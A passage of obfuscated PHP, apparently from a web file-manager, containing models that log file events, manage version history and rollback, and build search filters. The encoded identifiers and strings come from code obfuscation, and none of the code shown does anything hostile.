$D†ÈùŒÕªİ, $dˆ‡¦†ƒ§ù[1931] => $CÔÕ§„†ˆ[$dˆ‡¦†ƒ§ù[501]], $dˆ‡¦†ƒ§ù[1932] => $CÔÕ§„†ˆ[$dˆ‡¦†ƒ§ù[38]], $dˆ‡¦†ƒ§ù[522] => !empty($CÔÕ§„†ˆ[$dˆ‡¦†ƒ§ù[522]]) ? $CÔÕ§„†ˆ[$dˆ‡¦†ƒ§ù[522]] : $dˆ‡¦†ƒ§ù[43], $dˆ‡¦†ƒ§ù[1542] => USER_ID, $dˆ‡¦†ƒ§ù[426] => $e‰ğ‹èßÔù, $dˆ‡¦†ƒ§ù[1544] => $FÜ­éÇ¥ç); $this->addSystemLog($e‰ğ‹èßÔù, $EÆæ¦ãîÒ—); unset($EÆæ¦ãîÒ—[$dˆ‡¦†ƒ§ù[1932]], $EÆæ¦ãîÒ—[$dˆ‡¦†ƒ§ù[522]]); goto aÌ°óïšŞó; FÉã„‰Ì„Å: } private function addSystemLog($b­õ´ÙŠƒ‰, $Bîîíà±İ) { $DœšŒÇ•ç =& $_SERVER[œÕÊİğö]; if ($b­õ´ÙŠƒ‰ == $DœšŒÇ•ç[1933]) { $b­õ´ÙŠƒ‰ = $Bîîíà±İ[$DœšŒÇ•ç[454]][$DœšŒÇ•ç[1934]]; } else { if (in_array($b­õ´ÙŠƒ‰, array($DœšŒÇ•ç[1697], $DœšŒÇ•ç[1935]))) { $b­õ´ÙŠƒ‰ = $Bîîíà±İ[$DœšŒÇ•ç[454]][$DœšŒÇ•ç[745]]; } } $Cîî °’ë = array_merge($Bîîíà±İ, array($DœšŒÇ•ç[1936] => $Bîîíà±İ[$DœšŒÇ•ç[406]], $DœšŒÇ•ç[1937] => $Bîîíà±İ[$DœšŒÇ•ç[1937]])); Model($DœšŒÇ•ç[1661])->addLog($DœšŒÇ•ç[1938] . $b­õ´ÙŠƒ‰, $Cîî °’ë); } private function isCacheEvent($FÔ×óÏŞ†, $bù®ØÎ‰) { if ($FÔ×óÏŞ†[$_SERVER[œÕÊİğö][415]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($A‚°…œö¾, $c¥Ä¨´Ü¸±) { $a‚¶•£×ì— =& $_SERVER[œÕÊİğö]; $FŒêãÃ¿ = Model($a‚¶•£×ì—[1228])->sourceInfo($A‚°…œö¾); $f“Ì†›½¨ê = array($a‚¶•£×ì—[1934] => $c¥Ä¨´Ü¸±, $a‚¶•£×ì—[38] => $FŒêãÃ¿[$a‚¶•£×ì—[38]]); return $this->addEvent($A‚°…œö¾, $a‚¶•£×ì—[1933], $f“Ì†›½¨ê); } public function eventFileEdit($B¡‚Ó¸ğ) { $e» Ï´ˆ¬ƒ =& $_SERVER[œÕÊİğö]; $F‰°µ‡ŸÛ = array($e» Ï´ˆ¬ƒ[1939] => $_SERVER[$e» Ï´ˆ¬ƒ[1940]], $e» Ï´ˆ¬ƒ[1941] => strtolower(ACTION)); return $this->addEvent($B¡‚Ó¸ğ, $e» Ï´ˆ¬ƒ[1687], $F‰°µ‡ŸÛ); } public function eventRecycle($bˆšØ¶è‚ï, $bëˆ¹´¢ğ‘) { return $this->addEvent($bˆšØ¶è‚ï, $_SERVER[œÕÊİğö][1935], $bëˆ¹´¢ğ‘); } public function eventRemove($cœğ¹„“Ó») { $CŠ¬Ô‰‰´… =& $_SERVER[œÕÊİğö]; $dàí—ˆ‘» = Model($CŠ¬Ô‰‰´…[1228])->sourceInfo($cœğ¹„“Ó»); $b˜œŸéÙŠù = $dàí—ˆ‘»[$CŠ¬Ô‰‰´…[38]]; return $this->addEvent($dàí—ˆ‘»[$CŠ¬Ô‰‰´…[501]], $CŠ¬Ô‰‰´…[1686], $b˜œŸéÙŠù); } public function eventShare($Då°’Ç´°ˆ, $e‹Á‘¶ºª) { return $this->addEvent($Då°’Ç´°ˆ, $_SERVER[œÕÊİğö][1697], $e‹Á‘¶ºª); } public function eventMove($FŠÜ„¬ËŠ‘, $e”’¾ˆ‰, $aÒ¨Æ°¸Ä‹) { goto d¸íÕ½ÂÀİ; DÑ†öƒÀ‹‘: $this->addEvent($FŠÜ„¬ËŠ‘, $b¢œŞœİïù[554], $B·ÁÅ†…–Ò); $aŞğŸ«ù = $A ‰ã­´È->sourceInfo($FŠÜ„¬ËŠ‘); $B·ÁÅ†…–Ò = array($b¢œŞœİïù[406] => $aŞğŸ«ù[$b¢œŞœİïù[406]], $b¢œŞœİïù[38] => $aŞğŸ«ù[$b¢œŞœİïù[38]]); goto C‡Ïáğ¿òõ; b…Ú‡²ÊÊ: $f’ğÚ¶Òè = $A ‰ã­´È->sourceInfo($e”’¾ˆ‰); $Bİîéö»‘¯ = $A ‰ã­´È->sourceInfo($aÒ¨Æ°¸Ä‹); $B·ÁÅ†…–Ò = array($b¢œŞœİïù[1077] => $e”’¾ˆ‰, $b¢œŞœİïù[1942] => $f’ğÚ¶Òè[$b¢œŞœİïù[38]], $b¢œŞœİïù[1922] => !empty($f’ğÚ¶Òè[$b¢œŞœİïù[522]]) ? $f’ğÚ¶Òè[$b¢œŞœİïù[522]] : $b¢œŞœİïù[43], $b¢œŞœİïù[1078] => $aÒ¨Æ°¸Ä‹, $b¢œŞœİïù[1943] => $Bİîéö»‘¯[$b¢œŞœİïù[38]], $b¢œŞœİïù[1944] => !empty($Bİîéö»‘¯[$b¢œŞœİïù[522]]) ? $Bİîéö»‘¯[$b¢œŞœİïù[522]] : $b¢œŞœİïù[43]); goto DÑ†öƒÀ‹‘; d¸íÕ½ÂÀİ: $b¢œŞœİïù =& $_SERVER[œÕÊİğö]; $A ‰ã­´È = Model($b¢œŞœİïù[1228]); $aŞğŸ«ù = $A ‰ã­´È->sourceInfo($FŠÜ„¬ËŠ‘); goto b…Ú‡²ÊÊ; C‡Ïáğ¿òõ: $this->addEvent($e”’¾ˆ‰, $b¢œŞœİïù[1945], $B·ÁÅ†…–Ò); goto EÏÂä™İÂö; EÏÂä™İÂö: } public function eventCopy($Dìó³ĞÄ) { $this->eventCreate($Dìó³ĞÄ, $_SERVER[œÕÊİğö][552]); } public function eventRename($B—…ñíÈ©½, $DÇÑ‰ççµ…, $D¸¹»ŒÑ°´) { $dö‡Ü•–Œ† =& $_SERVER[œÕÊİğö]; $c™Š¨Éš­Ë = array($dö‡Ü•–Œ†[1077] => $DÇÑ‰ççµ…, $dö‡Ü•–Œ†[1078] => $D¸¹»ŒÑ°´); return $this->addEvent($B—…ñíÈ©½, $dö‡Ü•–Œ†[1242], $c™Š¨Éš­Ë); } public function eventAddComment($A™ÀçÏÑ±Í, $e˜ÇŸø™£ù) { return $this->addEvent($A™ÀçÏÑ±Í, $_SERVER[œÕÊİğö][1946], $e˜ÇŸø™£ù); } public function eventAddDesc($D‚áñ¥é÷ñ, $cñêô®õá½) { return $this->addEvent($D‚áñ¥é÷ñ, $_SERVER[œÕÊİğö][1947], $cñêô®õá½); } public function listBySource($bÅÒÅŠ•¹) { goto E¦ÔÎ·‹ë©; bÒƒ×¹ğù«: return $this->eventListParse($A•º™‰º¤ğ, $bÅÒÅŠ•¹); goto C‚É¿ÙÀ¾Ç; eÁŠ‰™Óê: if ($C‰¥‚ËñÑ[$E’„°º¥ ï[414]] == $E’„°º¥ ï[97]) { $bõ¡Ä‘Å²™ = Model($E’„°º¥ ï[1228])->listSearchChildren($bÅÒÅŠ•¹, 20000); $bõ¡Ä‘Å²™[] = $bÅÒÅŠ•¹ . $E’„°º¥ ï[251]; $bç öÉ¸äĞ = array($E’„°º¥ ï[406] => array($E’„°º¥ ï[7], $bõ¡Ä‘Å²™)); } $A•º™‰º¤ğ = $this->where($bç öÉ¸äĞ)->order($E’„°º¥ ï[1948])->selectPage(); if ($A•º™‰º¤ğ[$E’„°º¥ ï[374]][$E’„°º¥ ï[375]] == 0) { $A•º™‰º¤ğ[$E’„°º¥ ï[374]][$E’„°º¥ ï[375]] = 1; $A•º™‰º¤ğ[$E’„°º¥ ï[377]] = array(array($E’„°º¥ ï[421] => $bÅÒÅŠ•¹, $E’„°º¥ ï[1931] => $C‰¥‚ËñÑ[$E’„°º¥ ï[501]], $E’„°º¥ ï[1542] => $C‰¥‚ËñÑ[$E’„°º¥ ï[455]], $E’„°º¥ ï[426] => $E’„°º¥ ï[1949], $E’„°º¥ ï[427] => $C‰¥‚ËñÑ[$E’„°º¥ ï[204]], $E’„°º¥ ï[1544] => $E’„°º¥ ï[43])); } goto bÒƒ×¹ğù«; E¦ÔÎ·‹ë©: $E’„°º¥ ï =& $_SERVER[œÕÊİğö]; $C‰¥‚ËñÑ = Model($E’„°º¥ ï[1228])->sourceInfo($bÅÒÅŠ•¹); $bç öÉ¸äĞ = array($E’„°º¥ ï[421] => $bÅÒÅŠ•¹); goto eÁŠ‰™Óê; C‚É¿ÙÀ¾Ç: } private function eventListParse($dŒÜ¦ğ•é, $E¾ÜƒÚÆ‹º) { goto e¢ÎîµÁª; e¢ÎîµÁª: $cì­òÑåÑß =& $_SERVER[œÕÊİğö]; $d„ÅÙßÓ‡ = $dŒÜ¦ğ•é[$cì­òÑåÑß[377]]; $c¥§ççÛ…ñ = array_to_keyvalue($d„ÅÙßÓ‡, $cì­òÑåÑß[43], $cì­òÑåÑß[406]); goto DÇòõ¯àİ—; D‹”›††·‡: $c¥§ççÛ…ñ = array_unique($c¥§ççÛ…ñ); $C­Õ’Èôì‚ = array_unique(array_to_keyvalue($d„ÅÙßÓ‡, $cì­òÑåÑß[43], $cì­òÑåÑß[1551])); $A‚ƒ¦ÂÒáŒ = Model($cì­òÑåÑß[541])->userListInfo($C­Õ’Èôì‚); goto Fô‹ïƒ©óò; DÇòõ¯àİ—: $Dä‘ºÅÑ“„ = array_to_keyvalue($d„ÅÙßÓ‡, $cì­òÑåÑß[43], $cì­òÑåÑß[1937]); foreach ($d„ÅÙßÓ‡ as $AŸ¾š÷›) { $fáªÔ°ƒØ = $AŸ¾š÷›[$cì­òÑåÑß[454]]; if ($AŸ¾š÷›[$cì­òÑåÑß[39]] == $cì­òÑåÑß[554] && isset($fáªÔ°ƒØ[$cì­òÑåÑß[1077]])) { $c¥§ççÛ…ñ[] = $fáªÔ°ƒØ[$cì­òÑåÑß[1077]] . $cì­òÑåÑß[43]; $c¥§ççÛ…ñ[] = $fáªÔ°ƒØ[$cì­òÑåÑß[1078]] . $cì­òÑåÑß[43]; } if ($AŸ¾š÷›[$cì­òÑåÑß[39]] == $cì­òÑåÑß[1945] && isset($fáªÔ°ƒØ[$cì­òÑåÑß[406]])) { $c¥§ççÛ…ñ[] = $fáªÔ°ƒØ[$cì­òÑåÑß[406]] . $cì­òÑåÑß[43]; } } $c¥§ççÛ…ñ = array_merge($c¥§ççÛ…ñ, $Dä‘ºÅÑ“„, array($E¾ÜƒÚÆ‹º . $cì­òÑåÑß[43])); goto D‹”›††·‡; Fô‹ïƒ©óò: $A‡åó†ë‰ = Model($cì­òÑåÑß[822])->sourceListInfo($c¥§ççÛ…ñ, !0); foreach ($d„ÅÙßÓ‡ as &$AŸ¾š÷›) { if ($AŸ¾š÷›[$cì­òÑåÑß[39]] == $cì­òÑåÑß[554] && isset($AŸ¾š÷›[$cì­òÑåÑß[454]][$cì­òÑåÑß[1077]])) { $AŸ¾š÷›[$cì­òÑåÑß[454]][$cì­òÑåÑß[1077]] = $A‡åó†ë‰[$AŸ¾š÷›[$cì­òÑåÑß[454]][$cì­òÑåÑß[1077]]]; $AŸ¾š÷›[$cì­òÑåÑß[454]][$cì­òÑåÑß[1078]] = $A‡åó†ë‰[$AŸ¾š÷›[$cì­òÑåÑß[454]][$cì­òÑåÑß[1078]]]; } if ($AŸ¾š÷›[$cì­òÑåÑß[39]] == $cì­òÑåÑß[1945] && isset($AŸ¾š÷›[$cì­òÑåÑß[454]][$cì­òÑåÑß[406]])) { $AŸ¾š÷›[$cì­òÑåÑß[454]][$cì­òÑåÑß[406]] = $A‡åó†ë‰[$AŸ¾š÷›[$cì­òÑåÑß[454]][$cì­òÑåÑß[406]]]; } $AŸ¾š÷›[$cì­òÑåÑß[95]] = $A‡åó†ë‰[$AŸ¾š÷›[$cì­òÑåÑß[406]]]; $AŸ¾š÷›[$cì­òÑåÑß[1950]] = $A‡åó†ë‰[$AŸ¾š÷›[$cì­òÑåÑß[1937]]]; if ($AŸ¾š÷›[$cì­òÑåÑß[39]] == $cì­òÑåÑß[1686]) { $AŸ¾š÷›[$cì­òÑåÑß[1950]] = $AŸ¾š÷›[$cì­òÑåÑß[95]]; $AŸ¾š÷›[$cì­òÑåÑß[1937]] = $AŸ¾š÷›[$cì­òÑåÑß[1950]][$cì­òÑåÑß[406]]; $AŸ¾š÷›[$cì­òÑåÑß[95]] = !1; $AŸ¾š÷›[$cì­òÑåÑß[406]] = $cì­òÑåÑß[43]; } $AŸ¾š÷›[$cì­òÑåÑß[1882]] = $A‚ƒ¦ÂÒáŒ[$AŸ¾š÷›[$cì­òÑåÑß[1551]]]; } unset($AŸ¾š÷›); goto Bâˆ¾¹‚; Bâˆ¾¹‚: $dŒÜ¦ğ•é[$cì­òÑåÑß[377]] = $d„ÅÙßÓ‡; return $dŒÜ¦ğ•é; goto FÂï‹È«ƒß; FÂï‹È«ƒß: } public function removeBySource($f¬Ò½ªŠÊâ) { $bâøõ’¥À¶ = array($_SERVER[œÕÊİğö][421] => $f¬Ò½ªŠÊâ); $this->where($bâøõ’¥À¶)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\165\x72\x63\145\137\150\x69\163\164\157\x72\171"; public function historyCount($D©‚ë¸ÇÒ…) { goto C¤ÇÃ¯ŸËö; F§ç¿Ÿ…ƒ„: return array_to_keyvalue($aÎÌÀ½©Ì, $CÔ›Õ…ÄÀ‰[406], $CÔ›Õ…ÄÀ‰[503]); goto DÃ§óµë”†; C¤ÇÃ¯ŸËö: $CÔ›Õ…ÄÀ‰ =& $_SERVER[œÕÊİğö]; if (!$D©‚ë¸ÇÒ…) { return array(); } if (is_string($D©‚ë¸ÇÒ…) || is_int($D©‚ë¸ÇÒ…)) { $D©‚ë¸ÇÒ… = array($D©‚ë¸ÇÒ…); } goto d¼ƒ… —ä; d¼ƒ… —ä: $A´µØŒğŒ = array($CÔ›Õ…ÄÀ‰[406], $CÔ›Õ…ÄÀ‰[1752] => $CÔ›Õ…ÄÀ‰[503]); $aåš—½§é¥ = array($CÔ›Õ…ÄÀ‰[406] => array($CÔ›Õ…ÄÀ‰[7], $D©‚ë¸ÇÒ…)); $aÎÌÀ½©Ì = $this->field($A´µØŒğŒ)->where($aåš—½§é¥)->group($CÔ›Õ…ÄÀ‰[406])->select(); goto F§ç¿Ÿ…ƒ„; DÃ§óµë”†: } public function addHistory($E‰ä‹Ù‘ˆ, $a¹ÊĞ¨ ÆÄ = '') { $cØ÷°ÜÅ‚ =& $_SERVER[œÕÊİğö]; $aÜ­®³² = array($cØ÷°ÜÅ‚[421] => $E‰ä‹Ù‘ˆ[$cØ÷°ÜÅ‚[406]], $cØ÷°ÜÅ‚[1542] => isset($E‰ä‹Ù‘ˆ[$cØ÷°ÜÅ‚[457]]) ? $E‰ä‹Ù‘ˆ[$cØ÷°ÜÅ‚[457]] : $E‰ä‹Ù‘ˆ[$cØ÷°ÜÅ‚[455]], $cØ÷°ÜÅ‚[471] => $E‰ä‹Ù‘ˆ[$cØ÷°ÜÅ‚[470]], $cØ÷°ÜÅ‚[582] => $E‰ä‹Ù‘ˆ[$cØ÷°ÜÅ‚[88]], $cØ÷°ÜÅ‚[1951] => $a¹ÊĞ¨ ÆÄ); $e¸‰æÏ‡éì = $GLOBALS[$cØ÷°ÜÅ‚[6]][$cØ÷°ÜÅ‚[98]][$cØ÷°ÜÅ‚[1126]]; if ($e¸‰æÏ‡éì > 1) { $this->historyAutoClear($aÜ­®³²[$cØ÷°ÜÅ‚[406]]); $this->add($aÜ­®³²); } Hook::trigger($cØ÷°ÜÅ‚[1952], $aÜ­®³²); Model($cØ÷°ÜÅ‚[1953])->eventFileEdit($E‰ä‹Ù‘ˆ[$cØ÷°ÜÅ‚[406]]); } private function historyAutoClear($DôÃõœ‘ë) { goto B–›ÜŒÄ; BÙÊ¥ÑŞ…œ: $EÚ‘öÖ—£ = array($F«‰‹¶‡[421] => $DôÃõœ‘ë); $A¹¾ÔÃå®Ô = $this->field($F«‰‹¶‡[1954])->where($EÚ‘öÖ—£)->order($F«‰‹¶‡[1948])->select(); if (!$A¹¾ÔÃå®Ô || $C‰¿ğÇ“Ñ› >= count($A¹¾ÔÃå®Ô)) { return; } goto DÅÄƒÕ¹îá; DÅÄƒÕ¹îá: $a¥àª«ã Ñ = array_to_keyvalue($A¹¾ÔÃå®Ô, $F«‰‹¶‡[43], $F«‰‹¶‡[404]); $a¥àª«ã Ñ = array_slice($a¥àª«ã Ñ, $C‰¿ğÇ“Ñ›); $Bøí†¡Æ¯ñ = array_to_keyvalue($A¹¾ÔÃå®Ô, $F«‰‹¶‡[43], $F«‰‹¶‡[470]); goto fìªÔš§Æì; B–›ÜŒÄ: $F«‰‹¶‡ =& $_SERVER[œÕÊİğö]; $a®ÈÅåãäÈ = Model($F«‰‹¶‡[760])->get($F«‰‹¶‡[1148]); $C¿Ù¦ÚôÈ = $GLOBALS[$F«‰‹¶‡[6]][$F«‰‹¶‡[98]][$F«‰‹¶‡[1126]]; goto fÀ…çãçª; fìªÔš§Æì: $Bøí†¡Æ¯ñ = array_slice($Bøí†¡Æ¯ñ, $C‰¿ğÇ“Ñ›); if (!$a¥àª«ã Ñ || !$Bøí†¡Æ¯ñ) { return; } $EÚ‘öÖ—£ = array($F«‰‹¶‡[423] => array($F«‰‹¶‡[7], $a¥àª«ã Ñ)); goto a‚Êß®˜ëß; a‚Êß®˜ëß: $this->where($EÚ‘öÖ—£)->delete(); Model($F«‰‹¶‡[473])->remove($Bøí†¡Æ¯ñ); goto fŒ½×Õ×†±; fÀ…çãçª: $C‰¿ğÇ“Ñ› = $a®ÈÅåãäÈ == $F«‰‹¶‡[1149] ? 5 : $C¿Ù¦ÚôÈ; if ($C¿Ù¦ÚôÈ <= 1) { $C‰¿ğÇ“Ñ› = 1; } if ($C‰¿ğÇ“Ñ› >= 500) { return; } goto BÙÊ¥ÑŞ…œ; fŒ½×Õ×†±: } public function listData($e¢í»ñ­¹) { goto Bº÷Ÿ¼±ï£; c÷Œ¿Ê¹¯è: $cÖŞŞ¡É·â = $this->field($cÜÜ„«ÊÒİ)->where($aªŒ«¸—Œ)->order($C¤ßß—„Çº[1948])->selectPage(); $this->_listAppendUser($cÖŞŞ¡É·â[$C¤ßß—„Çº[377]]); $DòÌÃ†Ôà£ = Model($C¤ßß—„Çº[760])->get($C¤ßß—„Çº[1148]); goto aó¦‘›‘ãŒ; aó¦‘›‘ãŒ: $C·õÍöµ¶› = 5; if ($DòÌÃ†Ôà£ == $C¤ßß—„Çº[1149]) { $cÖŞŞ¡É·â[$C¤ßß—„Çº[377]] = array_slice($cÖŞŞ¡É·â[$C¤ßß—„Çº[377]], 0, $C·õÍöµ¶›); $cÖŞŞ¡É·â[$C¤ßß—„Çº[374]] = array($C¤ßß—„Çº[1956] => 1, $C¤ßß—„Çº[1957] => 20, $C¤ßß—„Çº[1958] => 1, $C¤ßß—„Çº[1959] => count($cÖŞŞ¡É·â[$C¤ßß—„Çº[377]])); } return $cÖŞŞ¡É·â; goto b¬œ÷«â­‚; Bº÷Ÿ¼±ï£: $C¤ßß—„Çº =& $_SERVER[œÕÊİğö]; $aªŒ«¸—Œ = array($C¤ßß—„Çº[421] => $e¢í»ñ­¹); $cÜÜ„«ÊÒİ = $C¤ßß—„Çº[1955]; goto c÷Œ¿Ê¹¯è; b¬œ÷«â­‚: } protected function _listAppendUser(&$D˜ˆá¼Ïƒô) { $f­‹©º×ç =& $_SERVER[œÕÊİğö]; $BÓÈ—™ˆ¤ = array_to_keyvalue($D˜ˆá¼Ïƒô, $f­‹©º×ç[43], $f­‹©º×ç[1551]); $f‚®‰ƒ‚†Ñ = Model($f­‹©º×ç[541])->userListInfo($BÓÈ—™ˆ¤); foreach ($D˜ˆá¼Ïƒô as &$F‰œ£öÑÙ˜) { $F‰£È£àò¥ = $F‰œ£öÑÙ˜[$f­‹©º×ç[1551]]; $F‰œ£öÑÙ˜[$f­‹©º×ç[455]] = $f‚®‰ƒ‚†Ñ[$F‰£È£àò¥] ? $f‚®‰ƒ‚†Ñ[$F‰£È£àò¥] : !1; } unset($F‰œ£öÑÙ˜); } public function fileInfo($cƒÆùÉÔ±) { $aØÇ°ª ‘î =& $_SERVER[œÕÊİğö]; $d¢«³‡ìè = $this->tablePrefix; $D´Ï™ÁÎ¸ = "{$d¢«³‡ìè}\151\157\137\x66\151\154\145\40\146\151\154\x65\x73\40\157\x6e\40\x66\151\154\x65\163\x2e\146\151\x6c\145\x49\x44\40\75\40\150\151\x73\x74\157\x72\x79\x2e\146\151\154\x65\x49\104"; return $this->alias($aØÇ°ª ‘î[1960])->where(array($aØÇ°ª ‘î[423] => $cƒÆùÉÔ±))->join($D´Ï™ÁÎ¸, $aØÇ°ª ‘î[1961])->find(); } public function removeItem($CÙÈ¦ ¨‚Ş) { $dà¹ñ¡óÎ =& $_SERVER[œÕÊİğö]; $c°¬¹‰¥øÉ = array($dà¹ñ¡óÎ[423] => $CÙÈ¦ ¨‚Ş); $B¬¢™óáÄ‚ = $this->where($c°¬¹‰¥øÉ)->find(); if ($B¬¢™óáÄ‚) { $f¥”Ç©äš = $this->where($c°¬¹‰¥øÉ)->delete(); Model($dà¹ñ¡óÎ[473])->remove($B¬¢™óáÄ‚[$dà¹ñ¡óÎ[470]]); return $f¥”Ç©äš; } return !1; } public function removeBySource($c³‰“Š‡ğ) { goto a–”©ç˜Œ©; A‰«áº°«: return !0; goto dÉº” ™È; a–”©ç˜Œ©: $bøãáÇ¯éõ =& $_SERVER[œÕÊİğö]; if (!$c³‰“Š‡ğ) { return !1; } if (!is_array($c³‰“Š‡ğ)) { $c³‰“Š‡ğ = array($c³‰“Š‡ğ); } goto båˆ¥§âˆŠ; båˆ¥§âˆŠ: $b¨š•‹‚±‘ = array($bøãáÇ¯éõ[421] => array($bøãáÇ¯éõ[7], $c³‰“Š‡ğ)); $B…Ò‹İ—”Â = $this->field($bøãáÇ¯éõ[471])->where($b¨š•‹‚±‘)->select(); if ($B…Ò‹İ—”Â) { $this->where($b¨š•‹‚±‘)->delete(); $b½ç¾·‰ñš = array_to_keyvalue($B…Ò‹İ—”Â, $bøãáÇ¯éõ[43], $bøãáÇ¯éõ[470]); Model($bøãáÇ¯éõ[473])->remove($b½ç¾·‰ñš); } goto A‰«áº°«; dÉº” ™È: } public function setDetail($e¯ƒÍŠ¤», $bÉ¾Ú®­„ô) { $C–è§Ê÷‘ =& $_SERVER[œÕÊİğö]; return $this->where(array($C–è§Ê÷‘[423] => $e¯ƒÍŠ¤»))->save(array($C–è§Ê÷‘[1951] => $bÉ¾Ú®­„ô)); } public function rollbackToItem($cº÷¥ñ¢ö‡, $A«‹Ï©›šç) { goto BØ…Ë¿Ğ¶å; D®íï‘Í«¨: $BËÀ‰•Ä§ø = $this->find($A«‹Ï©›šç); $dÓç²ÆÎŒ = array($c±×÷ß²Ü²[470] => $BËÀ‰•Ä§ø[$c±×÷ß²Ü²[470]], $c±×÷ß²Ü²[88] => $BËÀ‰•Ä§ø[$c±×÷ß²Ü²[88]], $c±×÷ß²Ü²[94] => time(), $c±×÷ß²Ü²[457] => USER_ID); Model($c±×÷ß²Ü²[822])->where(array($c±×÷ß²Ü²[406] => $cº÷¥ñ¢ö‡))->save($dÓç²ÆÎŒ); goto dÇ±ÔŞ÷ƒ; BØ…Ë¿Ğ¶å: $c±×÷ß²Ü² =& $_SERVER[œÕÊİğö]; $EªÎ“ğ¨Œ‘ = Model($c±×÷ß²Ü²[822])->sourceInfo($cº÷¥ñ¢ö‡); $this->addHistory($EªÎ“ğ¨Œ‘, LNG($c±×÷ß²Ü²[1962])); goto D®íï‘Í«¨; dÇ±ÔŞ÷ƒ: return $this->where(array($c±×÷ß²Ü²[423] => $A«‹Ï©›šç))->delete(); goto aš¢×´§‡; aš¢×´§‡: } public function clearSame($eÈ±ÕÄ®²) { goto Cñ¾ôà•ğ; Cñ¾ôà•ğ: $AÜ”Ò•â·½ =& $_SERVER[œÕÊİğö]; $b‹õõâ¹£Ï = $this->listData($eÈ±ÕÄ®²); $f¾¥İíìÌ­ = array_to_keyvalue_group($b‹õõâ¹£Ï, $AÜ”Ò•â·½[470]); goto BŠ–Ş·İÙ©; bââ÷·”–ï: if (!$E²Œİ½Üá¬) { return; } $this->where(array($AÜ”Ò•â·½[404] => array($AÜ”Ò•â·½[7], $E²Œİ½Üá¬)))->delete(); Model($AÜ”Ò•â·½[473])->remove($d‡ÉêÄ Ú); goto c½ğ†Ù¤â; BŠ–Ş·İÙ©: $d‡ÉêÄ Ú = array(); $E²Œİ½Üá¬ = array(); foreach ($f¾¥İíìÌ­ as $B„ñŠÙõ°ä) { if (!$B„ñŠÙõ°ä || count($B„ñŠÙõ°ä) <= 1) { continue; } foreach ($B„ñŠÙõ°ä as $eœ÷¸Úºà) { $d‡ÉêÄ Ú[] = $eœ÷¸Úºà[$AÜ”Ò•â·½[470]]; $E²Œİ½Üá¬[] = $eœ÷¸Úºà[$AÜ”Ò•â·½[404]]; } } goto bââ÷·”–ï; c½ğ†Ù¤â: } public function userSpace() { $D¦›ä’Ã¥ =& $_SERVER[œÕÊİğö]; $D–ì¶•”Å = $this->tablePrefix; $Bñƒ½¥–ÃÜ = array($D¦›ä’Ã¥[1542] => USER_ID); $F®ÎË§™ĞŸ = "{$D–ì¶•”Å}\x69\x6f\137\146\151\154\x65\40\x66\x69\154\145\163\x20\x6f\156\x20\146\x69\154\x65\x73\x2e\146\151\154\x65\111\x44\x20\75\x20\150\151\x73\x74\x6f\162\171\56\146\151\154\x65\111\x44"; return $this->alias($D¦›ä’Ã¥[1960])->where($Bñƒ½¥–ÃÜ)->join($F®ÎË§™ĞŸ, $D¦›ä’Ã¥[1961])->sum($D¦›ä’Ã¥[88]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($C»ªö”±‡) { goto e“‹ğ›¼¡¾; e™–İ“¯Å­: if (!$fåÌëŒ”Ê¼) { return array(); } $a½šÜ¯ÅÃ‹ = $fåÌëŒ”Ê¼[$c‰ƒÓå†±Ò[178]]; $A‚‡…‹¬ôØ = $c‰ƒÓå†±Ò[7]; goto cÌçÉ÷‡«Û; cÌçÉ÷‡«Û: if (!$fåÌëŒ”Ê¼[$c‰ƒÓå†±Ò[178]]) { $aÑ–‚àÎ¶¡ = array_to_keyvalue($aË…˜÷íªí, $c‰ƒÓå†±Ò[43], $c‰ƒÓå†±Ò[178]); $a½šÜ¯ÅÃ‹ = implode($c‰ƒÓå†±Ò[57], $aÑ–‚àÎ¶¡); $A‚‡…‹¬ôØ = $c‰ƒÓå†±Ò[1963]; } $e½Ã¯ã‹ê¯ = explode($c‰ƒÓå†±Ò[57], trim($a½šÜ¯ÅÃ‹, $c‰ƒÓå†±Ò[57])); return array($A‚‡…‹¬ôØ, $e½Ã¯ã‹ê¯); goto B½áŠ‡ñŒ; e“‹ğ›¼¡¾: $c‰ƒÓå†±Ò =& $_SERVER[œÕÊİğö]; $aË…˜÷íªí = KodIO::fileTypeList(); $fåÌëŒ”Ê¼ = $aË…˜÷íªí[$C»ªö”±‡]; goto e™–İ“¯Å­; B½áŠ‡ñŒ: } public function listPathType($aÎÈ¶”¸¼î) { $B´æÅ¾µª´ =& $_SERVER[œÕÊİğö]; $b¸ô¥‘Ñ‚ = $this->fileTypeWhere($aÎÈ¶”¸¼î); if (!$b¸ô¥‘Ñ‚) { return array(); } $cêÕ¦…¦ì‘ = array($B´æÅ¾µª´[583] => SourceModel::TYPE_USER, $B´æÅ¾µª´[584] => USER_ID, $B´æÅ¾µª´[580] => 0, $B´æÅ¾µª´[581] => $b¸ô¥‘Ñ‚); return $this->listSource($cêÕ¦…¦ì‘); } public function listSearch($AØæîòš±Ÿ, $b‡“‡˜×è§ = 300) { goto dø“å»˜êĞ; Cá®Ïœó¢: $this->_listSearchDesc($fĞ¸†ˆ, $AØæîòš±Ÿ, $F÷‰–‘¦); $this->_listSearchTag($fĞ¸†ˆ, $AØæîòš±Ÿ, $F÷‰–‘¦); $this->_listSearchGroupTag($fĞ¸†ˆ, $AØæîòš±Ÿ, $F÷‰–‘¦); goto eõŸ¼ñÃùø; dø“å»˜êĞ: $CˆåïØì =& $_SERVER[œÕÊİğö]; if (isset($AØæîòš±Ÿ[$CˆåïØì[1808]]) && $AØæîòš±Ÿ[$CˆåïØì[1808]]) { $AØæîòš±Ÿ[$CˆåïØì[1808]] = str_replace($CˆåïØì[391], $CˆåïØì[1964], trim($AØæîòš±Ÿ[$CˆåïØì[1808]])); } $EÀ¿ĞÒÌÈ = $this->_parseSearchWhere($AØæîòš±Ÿ); goto b¨¹¤‰ƒ¸÷; aÂ·ƒòŠ¾ô: $F÷‰–‘¦ = $cæÓ„ùƒ¬ì; $this->_listSearchBindPinyin($AØæîòš±Ÿ, $EÀ¿ĞÒÌÈ, $cæÓ„ùƒ¬ì); $this->alias($CˆåïØì[447])->_makeOrder(); goto c‚Ÿ–Õ…Š´; c‚Ÿ–Õ…Š´: $EÀ¿ĞÒÌÈ = $this->parseWhereLike($EÀ¿ĞÒÌÈ); $fĞ¸†ˆ = $this->distinct(!0)->field($cæÓ„ùƒ¬ì)->where($EÀ¿ĞÒÌÈ)->selectPage($b‡“‡˜×è§); $this->_listSearchFileContent($fĞ¸†ˆ, $AØæîòš±Ÿ, $F÷‰–‘¦, 